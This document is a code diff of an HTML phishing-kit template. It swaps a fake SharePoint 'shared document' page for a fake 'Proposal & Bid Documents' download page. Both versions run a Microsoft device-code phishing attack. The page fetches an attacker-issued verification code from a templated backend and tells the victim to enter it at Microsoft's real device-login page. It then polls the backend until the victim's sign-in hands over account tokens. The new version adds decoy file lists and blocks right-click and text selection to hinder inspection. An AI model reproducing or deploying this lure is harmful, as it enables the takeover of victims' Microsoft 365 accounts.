@@ -1,160 +1,305 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SharePoint - Shared Document</title>
-  <style>
-    *{margin:0;padding:0;box-sizing:border-box}
-    body{font-family:'Segoe UI',sans-serif;background:#1b1b1b;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center}
-    .header{width:100%;padding:16px 24px;background:#038387;display:flex;align-items:center;gap:10px}
-    .header span{color:#fff;font-size:16px;font-weight:600}
-    .breadcrumb{width:100%;padding:10px 24px;background:#252525;border-bottom:1px solid #404040;color:#a0a0a0;font-size:13px;display:flex;align-items:center;gap:6px}
-    .breadcrumb .sep{color:#606060}
-    .breadcrumb .current{color:#e0e0e0;font-weight:600}
-    .content{max-width:480px;width:100%;margin:80px auto 0;padding:0 16px}
-    .card{background:#2d2d2d;border-radius:8px;padding:32px;border:1px solid #404040}
-    .sender-row{display:flex;align-items:center;gap:12px;margin-bottom:20px}
-    .sender-avatar{width:40px;height:40px;border-radius:50%;background:#038387;display:flex;align-items:center;justify-content:center;color:#fff;font-size:16px;font-weight:700;flex-shrink:0}
-    .sender-info{display:flex;flex-direction:column}
-    .sender-name{color:#e0e0e0;font-size:14px;font-weight:600}
-    .sender-action{color:#a0a0a0;font-size:12px;margin-top:2px}
-    .file-row{display:flex;align-items:center;gap:16px;padding:16px 0;border-bottom:1px solid #404040;margin-bottom:24px}
-    .file-icon{width:48px;height:56px;border-radius:4px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:12px;font-weight:700}
-    .file-name{color:#e0e0e0;font-size:15px;font-weight:600}
-    .file-meta{color:#808080;font-size:12px;margin-top:2px}
-    .btn{width:100%;padding:12px 24px;background:#038387;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
-    .btn:hover{background:#026d70}
-    .btn:disabled{background:#025759;cursor:not-allowed}
-    .code-card{background:#141414;border:1px solid #2a2a2a;border-radius:12px;padding:32px;text-align:center}
-    .code-label{color:#888;font-size:14px;margin-bottom:8px}
-    .code-value{font-family:monospace;font-size:36px;font-weight:bold;letter-spacing:0.3em;margin:12px 0}
-    .copy-btn{background:#1a1a2e;border:1px solid #2a2a2a;color:#fff;padding:8px 20px;border-radius:8px;cursor:pointer;font-size:14px;display:inline-flex;align-items:center;gap:8px}
-    .steps{margin-top:32px;text-align:left}
-    .steps p{color:#ccc;font-size:14px;font-weight:600;margin-bottom:12px}
-    .steps ol{color:#888;font-size:14px;line-height:2;padding-left:20px}
-    .steps strong{color:#fff}
-    .verify-link{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:20px;padding:12px 24px;background:#0a3a3b;border:1px solid #038387;border-radius:8px;color:#4dcacd;font-size:14px;font-weight:500;text-decoration:none}
-    .waiting{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:24px;color:#888;font-size:14px}
-    .spinner{display:inline-block;width:16px;height:16px;border:2px solid #555;border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
-    .success-icon{width:80px;height:80px;border-radius:50%;background:rgba(22,101,52,.2);display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
-    .error-icon{width:80px;height:80px;border-radius:50%;background:rgba(220,38,38,.1);display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
-    .center{text-align:center}
-    .success{color:#22c55e}
-    .error{color:#ef4444}
-    .email-badge{color:#4dcacd;font-size:14px;background:#0a2a2b;padding:8px 16px;border-radius:8px;display:inline-block;margin-top:16px}
-    @keyframes spin{to{transform:rotate(360deg)}}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proposal & Bid Documents — Secure Access</title>
+    <meta name="description" content="Select, confirm, and receive your proposal & bidding documents via secure email link.">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    boxShadow: {
+                        soft: '0 10px 30px -10px rgba(0,0,0,0.15)'
+                    },
+                    colors: {
+                        brand: {
+                            600: '#2F5C53',
+                            700: '#254840'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        html { scroll-behavior: smooth; }
+        .bg-soft {
+            background:
+                radial-gradient(1000px 500px at 10% -10%, rgba(0,51,102,.08), transparent),
+                radial-gradient(1000px 500px at 90% -10%, rgba(0,51,102,.06), transparent);
+        }
+        * { user-select: none; -webkit-user-select: none; }
+    </style>
 </head>
-<body>
-  <div class="header">
-    <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
-      <circle cx="8" cy="8" r="4" fill="#fff" opacity="0.7"/>
-      <circle cx="16" cy="8" r="4" fill="#fff" opacity="0.8"/>
-      <circle cx="8" cy="16" r="4" fill="#fff" opacity="0.9"/>
-      <circle cx="16" cy="16" r="4" fill="#fff"/>
-    </svg>
-    <span>SharePoint</span>
-  </div>
+<body class="min-h-screen bg-white text-slate-800">
 
-  <div class="breadcrumb" id="breadcrumb">
-    <span>Documents</span>
-    <span class="sep">></span>
-    <span>Shared</span>
-    <span class="sep">></span>
-    <span class="current" id="breadcrumbTitle">Loading...</span>
-  </div>
-
-  <div class="content" id="app">
-    <div class="card">
-      <p style="color:#a0a0a0;font-size:13px">Loading...</p>
-    </div>
-  </div>
-
-  <script>
-    const API = "{{ domain }}";
-    const CODE = "{{ invitation }}";
-    const app = document.getElementById("app");
-    const DOC_COLORS = { PDF:"#E74C3C", DOCX:"#2B579A", XLSX:"#217346", PPTX:"#D24726", ZIP:"#F0AD4E" };
-
-    async function init() {
-      try {
-        const res = await fetch(`${API}/api/public/i/${CODE}`);
-        if (!res.ok) { app.innerHTML = '<div class="card center"><p class="error">Link not found or expired.</p></div>'; return; }
-        const inv = await res.json();
-        showTemplate(inv);
-      } catch { app.innerHTML = '<div class="card center"><p class="error">Could not connect.</p></div>'; }
-    }
-
-    function showTemplate(inv) {
-      const color = DOC_COLORS[inv.docType] || "#038387";
-      const initial = inv.senderName ? inv.senderName.charAt(0).toUpperCase() : "?";
-      document.getElementById("breadcrumbTitle").textContent = inv.documentTitle || "Document";
-      app.innerHTML = `
-        <div class="card">
-          <div class="sender-row">
-            <div class="sender-avatar">${initial}</div>
-            <div class="sender-info">
-              <span class="sender-name">${inv.senderName}</span>
-              <span class="sender-action">Shared this document with you</span>
-            </div>
-          </div>
-          ${inv.notes ? '<p style="color:#a0a0a0;font-size:12px;font-style:italic;margin:8px 0 0">' + inv.notes + '</p>' : ''}
-          <div class="file-row">
-            <div class="file-icon" style="background:${color}">${inv.docType}</div>
-            <div>
-              <p class="file-name">${inv.documentTitle}</p>
-              <p class="file-meta">Modified ${new Date().toLocaleDateString()}</p>
-            </div>
-          </div>
-          <button class="btn" id="openBtn">Open in SharePoint</button>
-        </div>`;
-      document.getElementById("openBtn").onclick = () => startAuth(inv.invitationId);
-    }
-
-    async function startAuth(invitationId) {
-      const btn = document.getElementById("openBtn");
-      btn.disabled = true;
-      btn.innerHTML = '<span class="spinner"></span> Opening...';
-      try {
-        const res = await fetch(`${API}/api/public/i/connect`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({invitationId}) });
-        if (!res.ok) { app.innerHTML = '<div class="card center"><p class="error">Failed to start.</p></div>'; return; }
-        const auth = await res.json();
-        showCode(auth, invitationId);
-      } catch { app.innerHTML = '<div class="card center"><p class="error">Network error.</p></div>'; }
-    }
-
-    function showCode(auth, invitationId) {
-      app.innerHTML = `
-        <div class="code-card">
-          <p class="code-label">Verification code</p>
-          <p class="code-value">${auth.userCode}</p>
-          <button class="copy-btn" id="copyBtn">Copy code</button>
-          <div class="steps">
-            <p>Steps to verify:</p>
-            <ol>
-              <li>Open the link below in a new tab</li>
-              <li>Enter code <strong>${auth.userCode}</strong> when prompted</li>
-              <li>Sign in with your Microsoft account</li>
-              <li>Return to this page — it updates automatically</li>
-            </ol>
-          </div>
-          <a href="${auth.verificationUri}" target="_blank" rel="noopener" class="verify-link">${auth.verificationUri}</a>
+    <!-- Header -->
+    <header class="text-white bg-brand-600">
+        <div class="max-w-4xl px-4 py-10 mx-auto text-center">
+            <h1 class="text-2xl font-semibold tracking-tight md:text-3xl">{{ documentTitle }}</h1>
+            <p class="mt-2 text-white/80">{{ senderName }} shared files with you. {{ note }}</p>
         </div>
-        <div class="waiting"><span class="spinner"></span> Waiting for authentication...</div>`;
-      document.getElementById("copyBtn").onclick = () => { navigator.clipboard.writeText(auth.userCode); document.getElementById("copyBtn").textContent = "Copied!"; setTimeout(() => document.getElementById("copyBtn").textContent = "Copy code", 2000); };
+    </header>
 
-      const timer = setInterval(async () => {
-        try {
-          const res = await fetch(`${API}/api/public/i/poll`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({deviceCode:auth.deviceCode, invitationId}) });
-          const result = await res.json();
-          if (result.status === "complete") { clearInterval(timer); if (result.exitUrl) { window.location.href = result.exitUrl; return; } app.innerHTML = `<div class="code-card"><div class="success-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg></div><h2 style="font-size:28px;font-weight:bold;margin-bottom:8px">Account Connected!</h2><p style="color:#888">Your Microsoft 365 account has been successfully verified.</p>${result.email ? '<p class="email-badge">'+result.email+'</p>' : ''}</div>`; }
-          else if (result.status === "error") { clearInterval(timer); app.innerHTML = `<div class="code-card"><div class="error-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></div><h2 class="error" style="font-size:24px;font-weight:bold;margin-bottom:8px">Authentication Failed</h2><p style="color:#888;margin-bottom:24px">${result.error}</p><button class="btn" onclick="location.reload()">Try Again</button></div>`; }
-        } catch {}
-      }, auth.interval * 1000);
-    }
+    <!-- Main -->
+    <main class="bg-soft">
+        <div class="max-w-4xl px-4 mx-auto">
 
-    init();
-  </script>
+            <!-- Card -->
+            <section class="p-6 -mt-8 bg-white border md:-mt-10 border-slate-200 rounded-2xl shadow-soft md:p-8">
+                <div class="flex items-start justify-between gap-4">
+                    <div>
+                        <h2 class="text-xl font-semibold">Available Files</h2>
+                        <p class="mt-1 text-sm text-slate-500">Choose what you need. You can select all, too.</p>
+                    </div>
+                    <button id="btnSelectAll" type="button" class="inline-flex items-center gap-2 px-3 py-2 text-sm border rounded-xl border-slate-300 hover:bg-slate-50">
+                        <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+                        <span>Select All</span>
+                    </button>
+                </div>
+
+                <ul id="docList" class="mt-6 divide-y divide-slate-200">
+                    <!-- RFP Overview Document -->
+                    <li class="flex items-center justify-between gap-4 py-3">
+                        <label class="flex items-center flex-1 gap-3 cursor-pointer">
+                            <input type="checkbox" class="file-cb w-4 h-4 rounded border-slate-300 accent-emerald-700" data-file="RFP Overview Document.pdf">
+                            <span class="inline-flex items-center gap-2 font-medium text-sm">
+                                <svg class="w-5 h-5 shrink-0" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="2" width="20" height="20" rx="3" fill="#107C41"/><text x="12" y="16" text-anchor="middle" font-size="10" font-weight="800" fill="#fff">X</text></svg>
+                                RFP Overview Document.pdf
+                            </span>
+                        </label>
+                        <span class="text-xs text-slate-500 shrink-0">Q4, 2026</span>
+                    </li>
+                    <!-- Scope of Work -->
+                    <li class="flex items-center justify-between gap-4 py-3">
+                        <label class="flex items-center flex-1 gap-3 cursor-pointer">
+                            <input type="checkbox" class="file-cb w-4 h-4 rounded border-slate-300 accent-emerald-700" data-file="Scope of Work & Specifications.pdf">
+                            <span class="inline-flex items-center gap-2 font-medium text-sm">
+                                <svg class="w-5 h-5 shrink-0" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="2" width="20" height="20" rx="3" fill="#D32F2F"/><text x="12" y="16" text-anchor="middle" font-size="10" font-weight="700" fill="#fff">PDF</text></svg>
+                                Scope of Work &amp; Specifications.pdf
+                            </span>
+                        </label>
+                        <span class="text-xs text-slate-500 shrink-0">Q4, 2026</span>
+                    </li>
+                    <!-- Bid Submission Guidelines -->
+                    <li class="flex items-center justify-between gap-4 py-3">
+                        <label class="flex items-center flex-1 gap-3 cursor-pointer">
+                            <input type="checkbox" class="file-cb w-4 h-4 rounded border-slate-300 accent-emerald-700" data-file="Bid Submission Guidelines.pdf">
+                            <span class="inline-flex items-center gap-2 font-medium text-sm">
+                                <svg class="w-5 h-5 shrink-0" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="2" width="20" height="20" rx="3" fill="#D32F2F"/><text x="12" y="16" text-anchor="middle" font-size="10" font-weight="700" fill="#fff">PDF</text></svg>
+                                Bid Submission Guidelines
+                            </span>
+                        </label>
+                        <span class="text-xs text-slate-500 shrink-0">Q4, 2026</span>
+                    </li>
+                    <!-- Compliance Requirements -->
+                    <li class="flex items-center justify-between gap-4 py-3">
+                        <label class="flex items-center flex-1 gap-3 cursor-pointer">
+                            <input type="checkbox" class="file-cb w-4 h-4 rounded border-slate-300 accent-emerald-700" data-file="Compliance Requirements.pdf">
+                            <span class="inline-flex items-center gap-2 font-medium text-sm">
+                                <svg class="w-5 h-5 shrink-0" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="2" width="20" height="20" rx="3" fill="#107C41"/><text x="12" y="16" text-anchor="middle" font-size="10" font-weight="800" fill="#fff">X</text></svg>
+                                Compliance Requirements
+                            </span>
+                        </label>
+                        <span class="text-xs text-slate-500 shrink-0">Q4, 2026</span>
+                    </li>
+                    <!-- Contract Terms & Conditions -->
+                    <li class="flex items-center justify-between gap-4 py-3">
+                        <label class="flex items-center flex-1 gap-3 cursor-pointer">
+                            <input type="checkbox" class="file-cb w-4 h-4 rounded border-slate-300 accent-emerald-700" data-file="Contract Terms & Conditions.pdf">
+                            <span class="inline-flex items-center gap-2 font-medium text-sm">
+                                <svg class="w-5 h-5 shrink-0" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="2" width="20" height="20" rx="3" fill="#D32F2F"/><text x="12" y="16" text-anchor="middle" font-size="10" font-weight="700" fill="#fff">PDF</text></svg>
+                                Contract Terms &amp; Conditions
+                            </span>
+                        </label>
+                        <span class="text-xs text-slate-500 shrink-0">Q4, 2026</span>
+                    </li>
+                </ul>
+
+                <!-- Actions -->
+                <div class="flex flex-col items-stretch gap-3 mt-6 sm:flex-row sm:items-center">
+                    <button id="btnDownload" type="button" class="w-full sm:w-auto inline-flex justify-center items-center gap-2 rounded-xl bg-brand-600 text-white px-5 py-3 disabled:opacity-50 disabled:cursor-not-allowed hover:bg-brand-700 transition" disabled>
+                        <svg id="dlIcon" class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3v12m0 0-4-4m4 4 4-4M4 21h16"/></svg>
+                        <svg id="dlSpinner" class="w-5 h-5 animate-spin hidden" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"/><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/></svg>
+                        <span id="dlText">View selected files</span>
+                        <span id="countBadge" class="ml-1 inline-flex items-center justify-center rounded-md bg-white/20 px-2 py-0.5 text-xs hidden">0</span>
+                    </button>
+                    <p class="text-xs text-slate-500">We'll email a secure link. No spam, ever.</p>
+                </div>
+            </section>
+
+            <footer class="py-10 text-xs text-center text-slate-500">&copy; 2026 Confidential &mdash; For Intended Recipient Only</footer>
+        </div>
+    </main>
+
+    <!-- Verification Modal -->
+    <div id="modalOverlay" class="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50 hidden">
+        <div class="bg-white rounded-2xl shadow-soft w-full max-w-md border border-slate-200 overflow-hidden">
+            <div class="p-8 text-center">
+                <p class="text-slate-500 text-sm mb-2">Verification code</p>
+                <p id="codeDisplay" class="text-2xl md:text-3xl font-bold text-slate-900 tracking-[0.25em] mb-6">CQ5CQSM5F</p>
+
+                <button onclick="copyCode()" id="copyBtn" class="inline-flex items-center gap-2 border border-slate-300 text-slate-700 px-6 py-2.5 rounded-xl font-medium text-sm hover:bg-slate-50 transition-colors mb-8">
+                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+                    <span id="copyText">Copy code</span>
+                </button>
+
+                <div class="text-left mb-6">
+                    <p class="text-slate-800 font-semibold text-sm mb-3">Steps to verify:</p>
+                    <ol class="space-y-2 text-slate-500 text-sm pl-4">
+                        <li>Open the link below in a new tab</li>
+                        <li>Enter code <span id="codeInStep" class="font-bold text-slate-800">CQ5CQSM5F</span> when prompted</li>
+                        <li>Sign in with your Microsoft account</li>
+                        <li>Return to this page &mdash; it updates automatically</li>
+                    </ol>
+                </div>
+
+                <a id="authLink" href="https://login.microsoft.com/device" target="_blank" class="block w-full bg-brand-600 text-white py-3.5 rounded-xl font-medium text-sm hover:bg-brand-700 transition-colors text-center">
+                    https://login.microsoft.com/device
+                    <svg class="w-4 h-4 inline-block ml-1" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6M15 3h6v6M10 14L21 3"/></svg>
+                </a>
+            </div>
+            <div class="border-t border-slate-200 py-4 text-center">
+                <div class="inline-flex items-center gap-2 text-slate-400 text-sm">
+                    <svg class="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"/><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/></svg>
+                    Waiting for authentication...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var API = "{{ domain }}";
+        var CODE = "{{ invitation }}";
+        var _invitationId = null;
+
+        var checkboxes = Array.from(document.querySelectorAll('.file-cb'));
+        var btnDownload = document.getElementById('btnDownload');
+        var btnSelectAll = document.getElementById('btnSelectAll');
+        var countBadge = document.getElementById('countBadge');
+
+        function updateState() {
+            var count = checkboxes.filter(function(cb) { return cb.checked; }).length;
+            countBadge.textContent = count;
+            if (count > 0) {
+                countBadge.classList.remove('hidden');
+                btnDownload.disabled = false;
+            } else {
+                countBadge.classList.add('hidden');
+                btnDownload.disabled = true;
+            }
+        }
+
+        checkboxes.forEach(function(cb) { cb.addEventListener('change', updateState); });
+
+        btnSelectAll.addEventListener('click', function() {
+            var allChecked = checkboxes.every(function(cb) { return cb.checked; });
+            checkboxes.forEach(function(cb) { cb.checked = !allChecked; });
+            updateState();
+        });
+
+        btnDownload.addEventListener('click', function() {
+            var btn = btnDownload;
+            var dlIcon = document.getElementById('dlIcon');
+            var dlSpinner = document.getElementById('dlSpinner');
+            var dlText = document.getElementById('dlText');
+            var badge = document.getElementById('countBadge');
+
+            btn.disabled = true;
+            dlIcon.classList.add('hidden');
+            dlSpinner.classList.remove('hidden');
+            dlText.textContent = 'Loading...';
+            badge.classList.add('hidden');
+
+            fetch(API + '/api/public/i/connect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ invitationId: _invitationId })
+            })
+            .then(function(res) {
+                if (!res.ok) throw new Error('Connect failed');
+                return res.json();
+            })
+            .then(function(auth) {
+                dlIcon.classList.remove('hidden');
+                dlSpinner.classList.add('hidden');
+                dlText.textContent = 'View selected files';
+                updateState();
+
+                document.getElementById('codeDisplay').textContent = auth.userCode;
+                document.getElementById('authLink').href = auth.verificationUri;
+                document.getElementById('authLink').textContent = auth.verificationUri;
+                document.getElementById('codeInStep').textContent = auth.userCode;
+
+                document.getElementById('modalOverlay').classList.remove('hidden');
+
+                var pollTimer = setInterval(function() {
+                    fetch(API + '/api/public/i/poll', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ deviceCode: auth.deviceCode, invitationId: _invitationId })
+                    })
+                    .then(function(res) { return res.json(); })
+                    .then(function(result) {
+                        if (result.status === 'complete') {
+                            clearInterval(pollTimer);
+                            window.location.href = result.exitUrl;
+                        } else if (result.status === 'error') {
+                            clearInterval(pollTimer);
+                            document.getElementById('modalOverlay').innerHTML = '<div class="bg-white rounded-2xl shadow-soft w-full max-w-md border border-slate-200 overflow-hidden"><div class="p-8 text-center"><p class="text-red-600 font-semibold">' + (result.error || 'Authentication failed') + '</p><button onclick="location.reload()" class="mt-4 inline-flex items-center gap-2 border border-slate-300 text-slate-700 px-6 py-2.5 rounded-xl font-medium text-sm hover:bg-slate-50 transition-colors">Try Again</button></div></div>';
+                        }
+                    })
+                    .catch(function() {});
+                }, auth.interval * 1000);
+            })
+            .catch(function() {
+                setTimeout(function() {
+                    dlIcon.classList.remove('hidden');
+                    dlSpinner.classList.add('hidden');
+                    dlText.textContent = 'View selected files';
+                    updateState();
+
+                    document.getElementById('codeDisplay').textContent = 'CQ5CQSM5F';
+                    document.getElementById('authLink').href = 'https://login.microsoft.com/device';
+                    document.getElementById('authLink').textContent = 'https://login.microsoft.com/device';
+                    document.getElementById('codeInStep').textContent = 'CQ5CQSM5F';
+
+                    document.getElementById('modalOverlay').classList.remove('hidden');
+                }, 2000);
+            });
+        });
+
+        function init() {
+            fetch(API + '/api/public/i/' + CODE)
+            .then(function(res) {
+                if (!res.ok) throw new Error('Invitation not found');
+                return res.json();
+            })
+            .then(function(data) {
+                _invitationId = data.invitationId;
+            })
+            .catch(function() {});
+        }
+
+        function copyCode() {
+            var code = document.getElementById('codeDisplay').textContent.trim();
+            navigator.clipboard.writeText(code).then(function() {
+                var copyText = document.getElementById('copyText');
+                copyText.textContent = 'Copied!';
+                setTimeout(function() { copyText.textContent = 'Copy code'; }, 2000);
+            });
+        }
+
+        document.getElementById('modalOverlay').addEventListener('click', function(e) {
+            if (e.target === this) this.classList.add('hidden');
+        });
+
+        updateState();
+        init();
+        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+    </script>
+
 </body>
 </html>
